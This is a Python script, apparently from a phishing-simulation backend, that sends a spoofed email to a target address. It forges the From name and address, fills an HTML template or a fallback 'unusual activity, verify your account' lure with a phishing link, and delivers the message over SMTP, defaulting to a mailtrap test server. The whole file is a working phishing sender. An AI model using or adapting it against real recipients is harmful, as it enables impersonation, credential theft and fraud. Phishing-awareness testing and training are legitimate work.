import os
import smtplib
import json
from email.mime.text import MIMEText
from email.header import Header

def run_spoof_email_attack():
    try:
        # Get template from environment (passed from main backend)
        template_json = os.environ.get("EMAIL_TEMPLATE")
        if template_json:
            template = json.loads(template_json)
            subject = template['subject']
            from_name = template['from_name']
            from_address = template['from_email']
            email_body = template['html_content']

            # Replace placeholders
            phishing_url = os.environ.get("PHISHING_URL", "")
            target_email = os.environ.get("TARGET_EMAIL", "")
            email_body = email_body.replace('{{phishing_url}}', phishing_url)
            email_body = email_body.replace('{{target_email}}', target_email)
            email_body = email_body.replace('{{from_name}}', from_name)
        else:
            # Fallback to old behavior
            subject = os.environ.get("SUBJECT", "Security Alert")
            from_name = os.environ.get("FROM_NAME", "Admin")
            from_address = os.environ.get("FROM_ADDRESS", "admin@company.com")
            phishing_url = os.environ.get("PHISHING_URL", "")
            email_body = f"""
            <html>
            <body>
                <p>Dear User,</p>
                <p>We detected unusual activity. Please verify your account:</p>
                <p><a href="{phishing_url}">Click here to verify</a></p>
                <p>Sincerely,<br>{from_name}</p>
            </body>
            </html>
            """

        target_email = os.environ.get("TARGET_EMAIL")
        if not target_email:
            raise Exception("TARGET_EMAIL environment variable required")

        msg = MIMEText(email_body, "html", "utf-8")
        msg["From"] = f"{from_name} <{from_address}>"
        msg["To"] = target_email
        msg["Subject"] = subject

        # SMTP configuration
        smtp_server = os.environ.get("SMTP_SERVER", "smtp.mailtrap.io")
        smtp_port = int(os.environ.get("SMTP_PORT", 2525))
        smtp_username = os.environ.get("SMTP_USERNAME", "")
        smtp_password = os.environ.get("SMTP_PASSWORD", "")

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            if smtp_username and smtp_password:
                server.login(smtp_username, smtp_password)
            server.send_message(msg)

        result = {
            "status": "success",
            "message": f"Phishing email sent to {target_email}",
            "template_used": template_json is not None
        }
        print(json.dumps(result))

    except Exception as e:
        error_result = {
            "status": "failed",
            "message": f"Failed to send email: {str(e)}",
            "template_used": template_json is not None
        }
        print(json.dumps(error_result))
        exit(1)

if __name__ == "__main__":
    run_spoof_email_attack()